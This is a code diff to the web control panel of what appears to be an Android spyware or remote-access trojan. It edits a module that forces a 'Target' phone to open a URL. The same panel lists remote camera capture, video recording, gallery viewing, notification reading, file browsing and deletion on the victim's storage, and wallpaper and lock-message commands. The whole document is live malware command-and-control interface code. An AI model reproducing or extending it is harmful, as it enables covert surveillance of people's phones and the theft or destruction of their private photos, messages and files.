@@ -107,9 +107,6 @@
                 const fm = d.fm;
                 b.innerHTML = `<div style="display:flex; gap:10px; margin-bottom:10px;"><input id="fmin" placeholder="cd Downloads / storage/emulated/0"><button onclick="cmd(document.getElementById('fmin').value); document.getElementById('fmin').value=''">EXE</button></div><p style="color:var(--primary); font-size:0.7rem; margin-bottom:10px;">Path: ${fm.path}</p><table>${fm.files.map(x=>`<tr><td onclick="cmd('${x.isDirectory?'cd':'get'} ${x.name}')" style="cursor:pointer">${x.isDirectory?'📁':'📄'} ${x.name}</td><td style="text-align:right"><button onclick="cmd('del ${x.name}')">DEL</button></td></tr>`).join('')}</table>`;
                 f.innerHTML = `<button onclick="cmd('cd /storage/emulated/0')">SDCARD</button><button onclick="cmd('cd /')">ROOT</button><button onclick="cmd('ls')">REFRESH</button>`;
-            } else if(curMod === 'openurl') {
-                b.innerHTML = `<p>Target akan dipaksa buka URL ini:</p><input id="ourl" placeholder="https://google.com">`;
-                f.innerHTML = `<button onclick="cmd('openurl '+document.getElementById('ourl').value)">BOOM (OPEN)</button>`;
             } else if(curMod === 'gallery') {
                 const g = d.gallery;
                 b.innerHTML = `<div class="gal-grid">${g.files.map(x=>`<div class="gal-item"><img src="data:image/jpeg;base64,${x.thumbnail}"/><p style="font-size:0.5rem">${x.name}</p></div>`).join('')}</div>`;
@@ -132,6 +129,9 @@
             } else if(curMod === 'setwallpaper') {
                 b.innerHTML = `<p>Direct Image URL:</p><input id="wurl" placeholder="https://domain.com/hack.jpg">`;
                 f.innerHTML = `<button onclick="cmd('set_wallpaper '+document.getElementById('wurl').value)">APPLY</button>`;
+            } else if(curMod === 'open_url') {
+                b.innerHTML = `<p>URL to open:</p><input id="ourl" placeholder="https://google.com">`;
+                f.innerHTML = `<button onclick="cmd('open_url '+document.getElementById('ourl').value)">OPEN</button>`;
             } else if(curMod === 'notifications') {
                 b.innerHTML = `<table><tr><th>App</th><th>Message</th></tr>${d.notifications.map(n=>`<tr><td>${n.packageName}</td><td>${n.title}: ${n.text}</td></tr>`).join('')}</table>`;
             }
@@ -166,7 +166,7 @@
                 {id:'takebackpic', i:'fa-camera', l:'CAM BACK'}, {id:'takefrontpic', i:'fa-video', l:'CAM FRONT'},
                 {id:'record_back', i:'fa-circle-dot', l:'REC BACK'}, {id:'record_front', i:'fa-record-vinyl', l:'REC FRONT'},
                 {id:'setwallpaper', i:'fa-image', l:'WALLPAPER'}, {id:'toast', i:'fa-lock', l:'LOCK/MSG'},
-                {id:'openurl', i:'fa-globe', l:'OPEN URL'}
+                {id:'open_url', i:'fa-external-link-alt', l:'OPEN URL'}
             ];
             document.getElementById('main-grid').innerHTML = btns.map(b=>`<div class="btn" onclick="${b.id==='flash'?'flash=!flash; cmd(flash?\'flashon\':\'flashoff\')':'openModal(\''+b.id+'\')'}"><i class="fas ${b.i}"></i>${b.l}</div>`).join('');
         }
